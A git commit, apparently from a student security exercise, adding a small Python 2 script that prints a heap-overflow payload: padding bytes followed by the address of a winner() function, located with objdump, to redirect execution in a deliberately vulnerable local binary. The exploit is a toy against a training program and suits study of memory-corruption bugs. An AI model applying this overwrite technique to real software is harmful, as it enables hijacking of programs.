5c668534cd796d602e5273fbf949505e9b947378
Jon <jvo7822@rit.edu>
2017-05-03 09:43:46 -0400

    heap overflow and fix for VOTD

---
+++ heap_overflow/heap.py
@@ -0,0 +1,18 @@
+#!/usr/bin/python
+
+# usage: ./heap <<< `./heap.py`
+
+# we find the address of winner() with objdump
+#
+# 
+# $ objdump -d heap | grep winner
+#      00000000004005d4 <winner>:
+#      00000000004005e4 <nowinner>:
+
+#
+# padding for the d, f and winner address
+pad = 'A'*72
+test = 'B'*4 + 'C'*4 #+ 'D' * 4
+winAddr = '\xd4\x05\x40\x00'
+
+print pad + test + winAddr
